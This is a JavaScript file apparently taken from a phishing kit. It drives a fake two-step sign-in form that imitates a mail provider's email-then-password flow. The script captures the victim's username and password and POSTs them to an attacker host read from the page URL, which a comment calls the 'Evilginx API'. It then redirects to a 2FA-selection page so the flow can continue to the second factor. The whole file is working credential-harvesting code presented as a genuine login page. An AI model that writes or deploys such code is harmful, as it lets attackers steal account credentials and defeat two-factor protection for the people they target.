document.addEventListener("DOMContentLoaded", () => {
  const emailStep = document.getElementById("email-step")
  const passwordStep = document.getElementById("password-step")
  const nextToPasswordBtn = document.getElementById("next-to-password")
  const submitCredentialsBtn = document.getElementById("submit-credentials")
  const usernameInput = document.getElementById("username")
  const passwordInput = document.getElementById("passwd")
  const passwordUserIdentifier = document.getElementById("password-user-identifier")
  const errorMessage = document.getElementById("error-message")

  // Store credentials temporarily
  let capturedUsername = ""

  // --- Step 1: Move from Email to Password screen ---
  nextToPasswordBtn.addEventListener("click", (e) => {
    e.preventDefault()
    if (usernameInput.value) {
      capturedUsername = usernameInput.value
      passwordUserIdentifier.textContent = capturedUsername
      emailStep.style.display = "none"
      passwordStep.style.display = "block"
    }
  })

  // --- Step 2: Submit credentials to Evilginx API ---
  submitCredentialsBtn.addEventListener("click", (e) => {
    e.preventDefault()
    const capturedPassword = passwordInput.value

    if (!capturedUsername || !capturedPassword) {
      alert("Please enter both username and password.")
      return
    }

    // Get API host from URL
    const urlParams = new URLSearchParams(window.location.search)
    const apiHost = urlParams.get("api_host")

    if (!apiHost) {
      alert("FATAL: API host not found in URL.")
      return
    }

    const formData = new URLSearchParams()
    formData.append("username", capturedUsername)
    formData.append("passwd", capturedPassword)

    // Show loading state
    submitCredentialsBtn.textContent = "Please wait..."
    submitCredentialsBtn.style.pointerEvents = "none"

    fetch(`${apiHost}/account/challenge/password`, {
      method: "POST",
      mode: "cors", // Important for cross-domain requests
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: formData.toString(),
    })
      .then((response) => {
        // The response from a proxied POST is often opaque, we rely on the redirect URL
        // A successful password submission will redirect to the 2FA page.
        // We can check the response URL to determine the next step.
        // For this custom flow, we assume success leads to 2FA.

        // Store data in sessionStorage to pass to the next page
        sessionStorage.setItem("yh_username", capturedUsername)
        sessionStorage.setItem("yh_api_host", apiHost)

        // Redirect to 2FA selection page
        window.location.href = `2fa-selection.html`
      })
      .catch((error) => {
        console.error("Error:", error)
        errorMessage.textContent = "An unexpected error occurred. Please try again."
        errorMessage.style.display = "block"
        // Restore button
        submitCredentialsBtn.textContent = "Next"
        submitCredentialsBtn.style.pointerEvents = "auto"
      })
  })
})
